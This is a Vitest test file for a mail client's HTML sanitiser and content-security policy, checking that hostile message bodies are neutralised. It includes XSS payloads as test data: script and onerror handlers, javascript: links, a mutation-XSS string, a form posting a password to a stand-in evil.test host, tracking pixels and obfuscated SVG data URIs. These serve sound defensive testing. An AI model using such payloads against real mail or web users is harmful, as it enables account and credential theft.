/**
 * Rule S4: the mail renderer, tested against hostile bodies with a real DOM and the real
 * sanitiser. Each case is something a stranger can put in a message.
 */
import createDOMPurify from "dompurify";
import { JSDOM } from "jsdom";
import { describe, expect, it } from "vitest";
import {
	freshNonce,
	mailContentPolicy,
	mailDocument,
	type Purifier,
	QUOTE_SUMMARY,
	sanitizeMailHtml,
} from "../../app/lib/mail-html.ts";

const dom = new JSDOM("");
const purify = createDOMPurify(dom.window) as unknown as Purifier;

const blocked = (body: string) => sanitizeMailHtml(body, { allowRemote: false, purify });
const allowed = (body: string) => sanitizeMailHtml(body, { allowRemote: true, purify });

/** Parse the sanitised output so assertions are about the DOM, not about string shapes. */
function parse(html: string): Document {
	return new JSDOM(`<!DOCTYPE html><body>${html}</body>`).window.document;
}

describe("sanitizeMailHtml removes active content", () => {
	it.each([
		["a script element", "<p>hi</p><script>steal()</script>"],
		["an inline handler", '<img src="data:image/gif;base64,AA==" onerror="steal()">'],
		["an SVG with onload", '<svg onload="steal()"><circle r="1"/></svg>'],
		["a javascript link", '<a href="javascript:steal()">click</a>'],
		["a javascript link with entities", '<a href="jav&#x09;ascript:steal()">click</a>'],
		["a data HTML link", '<a href="data:text/html,<script>steal()</script>">click</a>'],
		["an iframe", '<iframe src="https://evil.test"></iframe>'],
		["an iframe with srcdoc", '<iframe srcdoc="<script>steal()</script>"></iframe>'],
		["an object and an embed", '<object data="https://evil.test/x.swf"></object><embed src="x">'],
		["a meta refresh", '<meta http-equiv="refresh" content="0;url=https://evil.test">'],
		["a base element", '<base href="https://evil.test/">'],
		["a style element", "<style>body{background:url(https://evil.test/p.gif)}</style>"],
		["a link stylesheet", '<link rel="stylesheet" href="https://evil.test/x.css">'],
		[
			"a form that posts away",
			'<form action="https://evil.test"><input name="password"><button>Go</button></form>',
		],
		["a formaction button", '<button formaction="https://evil.test">Go</button>'],
		[
			"a mutation-XSS classic",
			'<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=steal()&gt;">',
		],
	])("%s", (_name, body) => {
		const document = parse(blocked(body).html);
		expect(
			document.querySelectorAll(
				"script, iframe, object, embed, meta, base, style, link, form, input, button",
			).length,
		).toBe(0);
		for (const element of document.querySelectorAll("*")) {
			for (const attribute of element.getAttributeNames()) {
				expect(attribute.startsWith("on"), `${element.tagName} keeps ${attribute}`).toBe(false);
				expect(["action", "formaction", "srcdoc"]).not.toContain(attribute);
			}
			const href = element.getAttribute("href");
			if (href !== null)
				expect(href.trim().toLowerCase()).not.toMatch(/^(javascript|data|vbscript):/);
		}
		expect(blocked(body).html).not.toContain("steal()");
	});

	it("keeps ordinary formatting", () => {
		const { html } = blocked(
			"<p>Hello <b>bold</b> <i>italic</i></p><ul><li>one</li></ul><table><tr><td>cell</td></tr></table>",
		);
		const document = parse(html);
		expect(document.querySelector("b")?.textContent).toBe("bold");
		expect(document.querySelectorAll("li, td").length).toBe(2);
	});
});

describe("sanitizeMailHtml and remote content", () => {
	it("takes a remote image out and counts it", () => {
		const result = blocked(
			'<p>Hi</p><img src="https://tracker.test/pixel.gif" width="1" height="1">',
		);
		expect(result.blockedRemote).toBe(1);
		expect(result.html).not.toContain("tracker.test");
	});

	it.each([
		["a protocol-relative image", '<img src="//tracker.test/p.gif">'],
		["an http image", '<img src="http://tracker.test/p.gif">'],
		["a srcset", '<img srcset="https://tracker.test/a.png 1x, https://tracker.test/b.png 2x">'],
		[
			"a table background",
			'<table background="https://tracker.test/bg.png"><tr><td>x</td></tr></table>',
		],
		["a CSS background", '<div style="background-image: url(https://tracker.test/bg.png)">x</div>'],
		[
			"a CSS background with quotes",
			"<div style=\"background:url('//tracker.test/bg.png')\">x</div>",
		],
	])("blocks %s", (_name, body) => {
		const result = blocked(body);
		expect(result.blockedRemote).toBeGreaterThan(0);
		expect(result.html).not.toContain("tracker.test");
	});

	it("keeps inline and attached images", () => {
		const result = blocked(
			'<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw="><img src="cid:logo@sender.test">',
		);
		expect(result.blockedRemote).toBe(0);
		expect(parse(result.html).querySelectorAll("img").length).toBe(2);
	});

	it("keeps remote images once the reader allowed them, and counts nothing", () => {
		const result = allowed('<img src="https://cdn.sender.test/logo.png">');
		expect(result.blockedRemote).toBe(0);
		expect(result.html).toContain("https://cdn.sender.test/logo.png");
	});

	it("still removes active content when remote content is allowed", () => {
		const result = allowed(
			'<img src="https://cdn.sender.test/logo.png" onerror="steal()"><script>steal()</script>',
		);
		expect(result.html).not.toContain("steal()");
	});

	it("does not leak the hook into the next call", () => {
		blocked('<img src="https://tracker.test/p.gif">');
		expect(allowed('<img src="https://cdn.sender.test/logo.png">').html).toContain(
			"cdn.sender.test",
		);
	});
});

describe("the ways a message is known to move by itself are taken out of its styles", () => {
	/** The properties left in the first `div`'s own style, as the DOM reads them. */
	const declared = (html: string) => {
		const style = parse(html).querySelector("div")?.style;
		const names: string[] = [];
		for (let index = 0; index < (style?.length ?? 0); index++) names.push(style?.item(index) ?? "");
		return names;
	};

	it.each([
		["a delayed transition of a height", "height:calc(100vh + 1px);transition:height 0s .2s"],
		["an important transition", "height:200vh;transition:height 1s 1s !important"],
		[
			"a transition written in longhands",
			"height:50vh;transition-property:height;transition-delay:1s",
		],
		["a prefixed transition", "height:50vh;-webkit-transition:height 1s"],
		["an animation", "height:50vh;animation:grow 1s infinite"],
		["an animation in longhands", "height:50vh;animation-name:grow;animation-delay:2s"],
		["a prefixed animation", "height:50vh;-webkit-animation:grow 1s"],
	])("%s is taken out, and the rest of the style stays", (_, style) => {
		for (const sanitize of [blocked, allowed]) {
			const names = declared(sanitize(`<div style="${style}">x</div>`).html);
			expect(names, style).toContain("height");
			expect(
				names.filter((name) => /transition|animation/i.test(name)),
				style,
			).toEqual([]);
		}
	});

	it("a style that only moves is taken out whole", () => {
		const div = parse(blocked('<div style="transition:height 1s">x</div>').html).querySelector(
			"div",
		);
		expect(div?.hasAttribute("style")).toBe(false);
	});

	it("a style without motion is left as it was written", () => {
		const html = blocked('<div style="color: red; height: 20px">x</div>').html;
		expect(parse(html).querySelector("div")?.getAttribute("style")).toBe(
			"color: red; height: 20px",
		);
	});

	it("an element the parser gives no style object loses its style whole", () => {
		// No element of the html profile is such an element; a purifier that hands the hook one
		// stands in for the day one is.
		const odd: Purifier = {
			hook: undefined as ((node: Element) => void) | undefined,
			addHook(_, hook) {
				this.hook = hook;
			},
			removeHook() {
				this.hook = undefined;
			},
			sanitize() {
				const node = dom.window.document.createElementNS("urn:podbay:test", "odd");
				node.setAttribute("style", "transition:height 1s");
				this.hook?.(node);
				return node.outerHTML;
			},
		} as Purifier & { hook?: (node: Element) => void };
		expect(sanitizeMailHtml("<p>x</p>", { allowRemote: false, purify: odd }).html).not.toContain(
			"style",
		);
	});
});

describe("an embedded picture of a kind not in the list is taken out (an SVG moves by itself)", () => {
	const SVG = "PHN2Zy8+"; // "<svg/>" in base64
	const PNG = "iVBORw0KGgo=";

	it.each([
		["an SVG", `data:image/svg+xml;base64,${SVG}`],
		["an SVG with its type in capitals", `DATA:IMAGE/SVG+XML;base64,${SVG}`],
		["an SVG after spaces", `   data:image/svg+xml;base64,${SVG}`],
		["an SVG without base64", "data:image/svg+xml,%3Csvg%2F%3E"],
		["an SVG with a charset", "data:image/svg+xml;charset=utf-8,%3Csvg%2F%3E"],
		["an SVG with spaces in its type", `data: image/svg+xml ;base64,${SVG}`],
		["an SVG with a tab in its type", `data:image/svg&#9;+xml;base64,${SVG}`],
		["an SVG with a tab in its scheme", `da&#9;ta:image/svg+xml;base64,${SVG}`],
		["data with no type", "data:,hello"],
		["a page", "data:text/html,%3Cp%3Ehi"],
	])("%s is taken out of a picture's address", (_, address) => {
		for (const sanitize of [blocked, allowed]) {
			const img = parse(sanitize(`<img src="${address}" alt="">`).html).querySelector("img");
			expect(img?.hasAttribute("src"), address).toBe(false);
			const table = parse(
				sanitize(`<table background="${address}"><tr><td>x</td></tr></table>`).html,
			);
			expect(table.querySelector("table")?.hasAttribute("background"), address).toBe(false);
		}
	});

	it("a data: address in a srcset is taken out whatever its type: the split at its comma leaves it unloadable", () => {
		// This holds without the picture check; it says what the split already does.
		for (const srcset of [
			`data:image/png;base64,${PNG} 1x, data:image/svg+xml;base64,${SVG} 2x`,
			`data:image/png;base64,${PNG} 1x`,
		]) {
			const html = allowed(`<img srcset="${srcset}" alt="">`).html;
			expect(parse(html).querySelector("img")?.hasAttribute("srcset"), srcset).toBe(false);
		}
	});

	it("a remote address that holds the letters data: is a remote picture, counted and shown when allowed", () => {
		const img = '<img src="https://pics.sender.test/a.png?metadata:1" alt="">';
		const hidden = blocked(img);
		expect(hidden.blockedRemote).toBe(1);
		expect(parse(hidden.html).querySelector("img")?.hasAttribute("src")).toBe(false);
		expect(parse(allowed(img).html).querySelector("img")?.getAttribute("src")).toBe(
			"https://pics.sender.test/a.png?metadata:1",
		);
	});

	it("a picture typed image/x-icon is taken out: it is not in the list", () => {
		const img = parse(blocked('<img src="data:image/x-icon;base64,AAABAA==" alt="">').html);
		expect(img.querySelector("img")?.hasAttribute("src")).toBe(false);
	});

	it.each([
		["a PNG", `data:image/png;base64,${PNG}`],
		["a GIF", "data:image/gif;base64,R0lGODlhAQABAAAAACw="],
		["a JPEG typed image/jpg, a common misspelling", "data:image/jpg;base64,/9j/4AAQ"],
	])("%s stays: it is a picture the app shows", (_, address) => {
		const img = parse(blocked(`<img src="${address}" alt="">`).html).querySelector("img");
		expect(img?.getAttribute("src")).toBe(address);
	});

	it.each([
		["content, unquoted", `content:url(data:image/svg+xml;base64,${SVG})`],
		["content, in double quotes", `content:url(&quot;data:image/svg+xml;base64,${SVG}&quot;)`],
		[
			"a background in capitals, in single quotes",
			`background:url('DATA:IMAGE/SVG+XML;base64,${SVG}') no-repeat`,
		],
		["a background image with spaces", `background-image:url( data:image/svg+xml,x )`],
		["a list marker", "list-style-image:url(data:image/svg+xml,x)"],
		["an escaped address", "content:url(d\\61ta:image/svg+xml,x)"],
		[
			// The type is cut from the same text its place was found in: letters that grow when
			// lowered cannot move the cut past `image/svg+xml;`.
			"letters that grow when lowered",
			`content:image-set('data:image/png;${"İ".repeat(14)},x' 2x, 'data:image/svg+xml;image/png;base64,${SVG}' 1x)`,
		],
		["a tab in the type", `content:url('data:image/svg&#9;+xml;base64,${SVG}')`],
		// An address parser drops the tab, so this is a data: address in the frame.
		["a tab in the scheme", `content:url('da&#9;ta:image/svg+xml;base64,${SVG}')`],
		["a custom property", "--picture:url(data:image/svg+xml,x)"],
	])("an SVG in a style (%s) is taken out, and the rest of the style stays", (_, style) => {
		for (const sanitize of [blocked, allowed]) {
			const html = sanitize(`<div style="color:red;${style}">x</div>`).html;
			const div = parse(html).querySelector("div");
			expect(html, style).not.toMatch(/svg|--picture\s*:/i);
			expect(div?.style.getPropertyValue("color"), style).toBe("red");
		}
	});

	it.each([
		["a shorthand with var()", `list-style:var(--x,inside url(data:image/svg+xml;base64,${SVG}))`],
		[
			"var() with a tab in the scheme",
			`content:var(--x,url('da&#9;ta:image/svg+xml;base64,${SVG}'))`,
		],
		[
			"a custom property used by var()",
			"--picture:url(data:image/svg+xml,x);content:var(--picture)",
		],
		[
			// A custom property keeps its text as written: only the var() that uses it decodes it.
			"an escaped address in a custom property",
			"--picture:url(d\\61ta:image/svg+xml,x);content:var(--picture)",
		],
		["env()", `content:env(x,url(data:image/svg+xml;base64,${SVG}))`],
		["attr()", `content:attr(data-x,url(data:image/svg+xml;base64,${SVG}))`],
	])("a style that holds a value the parser has not decided (%s) goes whole", (_, style) => {
		for (const sanitize of [blocked, allowed]) {
			const html = sanitize(`<div style="color:red;${style}">x</div>`).html;
			expect(parse(html).querySelector("div")?.hasAttribute("style"), style).toBe(false);
		}
	});

	it("a PNG in a style stays", () => {
		const html = blocked(
			`<div style="background-image:url(data:image/png;base64,${PNG})">x</div>`,
		).html;
		expect(parse(html).querySelector("div")?.style.getPropertyValue("background-image")).toContain(
			"data:image/png",
		);
	});
});

describe("links", () => {
	it("open outside the frame and send no referrer or opener", () => {
		const anchor = parse(
			blocked('<a href="https://example.org/page" target="_self" rel="opener">read</a>').html,
		).querySelector("a");
		expect(anchor?.getAttribute("href")).toBe("https://example.org/page");
		expect(anchor?.getAttribute("target")).toBe("_blank");
		expect(anchor?.getAttribute("rel")).toBe("noopener noreferrer nofollow");
	});
});

describe("mailContentPolicy", () => {
	const nonce = "QUJDREVGR0hJSktMTU5PUA==";

	it("allows no network load while remote content is blocked", () => {
		const policy = mailContentPolicy({ allowRemote: false, nonce });
		expect(policy).toContain("default-src 'none'");
		expect(policy.split("; ")).toContain("img-src data:");
		expect(policy).not.toContain("https:");
		expect(policy).not.toContain("http:");
	});

	it("allows only https images once the reader allowed remote content", () => {
		const policy = mailContentPolicy({ allowRemote: true, nonce });
		expect(policy).toContain("img-src data: https:");
		expect(policy).not.toMatch(/(connect|font|media|frame|object)-src/);
	});

	it("allows script only by nonce, never inline or by host", () => {
		const policy = mailContentPolicy({ allowRemote: true, nonce });
		expect(policy).toContain(`script-src 'nonce-${nonce}'`);
		expect(policy).not.toContain("script-src 'unsafe-inline'");
		expect(policy).not.toContain("unsafe-eval");
	});

	it("forbids form submission and a base element", () => {
		const policy = mailContentPolicy({ allowRemote: false, nonce });
		expect(policy).toContain("form-action 'none'");
		expect(policy).toContain("base-uri 'none'");
	});
});

describe("mailDocument", () => {
	it("carries the policy, a no-referrer hint and the nonce on its one script", () => {
		const nonce = freshNonce();
		const html = mailDocument({
			sanitizedBody: "<p>hi</p>",
			autoSize: true,
			allowRemote: false,
			nonce,
		});
		const document = new JSDOM(html).window.document;
		const policy = document
			.querySelector('meta[http-equiv="Content-Security-Policy"]')
			?.getAttribute("content");
		expect(policy).toBe(mailContentPolicy({ allowRemote: false, nonce }));
		expect(document.querySelector('meta[name="referrer"]')?.getAttribute("content")).toBe(
			"no-referrer",
		);
		const scripts = [...document.querySelectorAll("script")];
		expect(scripts).toHaveLength(1);
		expect(scripts[0]?.getAttribute("nonce")).toBe(nonce);
	});

	it("has no script at all when the frame does not size itself", () => {
		const html = mailDocument({
			sanitizedBody: "<p>hi</p>",
			autoSize: false,
			allowRemote: false,
			nonce: freshNonce(),
		});
		expect(new JSDOM(html).window.document.querySelectorAll("script").length).toBe(0);
	});

	it("refuses a nonce that could break out of the attribute", () => {
		expect(() =>
			mailDocument({ sanitizedBody: "", autoSize: true, allowRemote: false, nonce: '"><script>' }),
		).toThrow();
	});

	it("uses a different nonce every time", () => {
		const nonces = new Set(Array.from({ length: 50 }, () => freshNonce()));
		expect(nonces.size).toBe(50);
	});
});

describe("a resource address that is neither embedded nor remote", () => {
	const DATA = "data:image/gif;base64,AA==";

	it.each([
		["a relative image", '<img src="x">'],
		["an image at a path of the app", '<img src="/api/v1/mailboxes/a%40b.test/emails">'],
		["a relative background", '<table background="tracker.gif"><tr><td>x</td></tr></table>'],
		["an unresolved embedded image", '<img src="cid:logo@sender.test">'],
		["a file address", '<img src="file:///etc/passwd">'],
		["a set with one relative entry", `<img srcset="${DATA} 1x, big.png 2x">`],
	])(
		"%s is taken out whatever the reader allowed, and is not offered to be allowed",
		(_n, body) => {
			for (const result of [blocked(body), allowed(body)]) {
				const document = parse(result.html);
				expect(document.querySelectorAll("[src], [srcset], [background], [poster]")).toHaveLength(
					0,
				);
				expect(result.blockedRemote).toBe(0);
			}
		},
	);

	it("keeps embedded data, and counts only what is remote", () => {
		const body = `<img src="${DATA}"><img src="https://cdn.test/a.png"><img src="b.png">`;
		const kept = parse(blocked(body).html).querySelectorAll("img[src]");
		expect([...kept].map((image) => image.getAttribute("src"))).toEqual([DATA]);
		expect(blocked(body).blockedRemote).toBe(1);
		const shown = parse(allowed(body).html).querySelectorAll("img[src]");
		expect([...shown].map((image) => image.getAttribute("src"))).toEqual([
			DATA,
			"https://cdn.test/a.png",
		]);
	});
});

describe("quoted text at the end of a reply", () => {
	const folded = (body: string) =>
		parse(blocked(body).html).querySelectorAll("details.podbay-quote");

	it("is folded behind one line that needs no script to open", () => {
		const document = parse(
			blocked("<p>Thanks, see below.</p><blockquote><p>Old words</p></blockquote>").html,
		);
		const details = document.querySelector("details.podbay-quote");
		expect(details?.hasAttribute("open")).toBe(false);
		expect(details?.querySelector("summary")?.textContent).toBe(QUOTE_SUMMARY);
		expect(details?.querySelector("blockquote")?.textContent).toBe("Old words");
		expect(document.body.textContent).toContain("Thanks, see below.");
	});

	it("is found inside the wrapper a mail program puts around it", () => {
		const body =
			'<div dir="ltr">Agreed.</div><div class="quote"><div>On Monday, Ada wrote:</div><blockquote>Old</blockquote></div><div><br></div>';
		expect(folded(body)).toHaveLength(1);
	});

	it.each([
		["a quote that is answered underneath", "<blockquote>Old</blockquote><p>My answer</p>"],
		[
			"a quote with a picture after it",
			'<p>a</p><blockquote>Old</blockquote><img src="data:image/gif;base64,AA==">',
		],
		["a message that is only a quote", "<blockquote>All there is</blockquote>"],
		["an empty quote", "<p>a</p><blockquote> </blockquote>"],
	])("leaves %s as it is", (_name, body) => {
		expect(folded(body)).toHaveLength(0);
	});

	it("folds the outer quote only", () => {
		const body =
			"<p>a</p><blockquote>one<blockquote>two<blockquote>three</blockquote></blockquote></blockquote>";
		const all = folded(body);
		expect(all).toHaveLength(1);
		expect(all[0]?.querySelectorAll("blockquote")).toHaveLength(3);
	});

	it("still cleans what is inside the fold", () => {
		const body =
			'<p>a</p><blockquote><script>steal()</script><img src="https://evil.test/p.gif" onerror="steal()"><a href="javascript:steal()">x</a></blockquote>';
		const result = blocked(body);
		const document = parse(result.html);
		expect(document.querySelectorAll("script, [onerror], [src]")).toHaveLength(0);
		expect(document.querySelector("a")?.getAttribute("href")).toBeNull();
		expect(result.blockedRemote).toBe(1);
	});

	it("cannot be used to hide a message's own words: only the sender's blockquote is folded", () => {
		const body =
			'<details class="podbay-quote"><summary>Show quoted text</summary><p>Hidden by the sender</p></details><p>Shown</p>';
		const document = parse(blocked(body).html);
		// The sender may fold their own text, as any HTML can; nothing of ours is added to it.
		expect(document.querySelectorAll("details")).toHaveLength(1);
		expect(document.querySelectorAll("summary")).toHaveLength(1);
	});
});
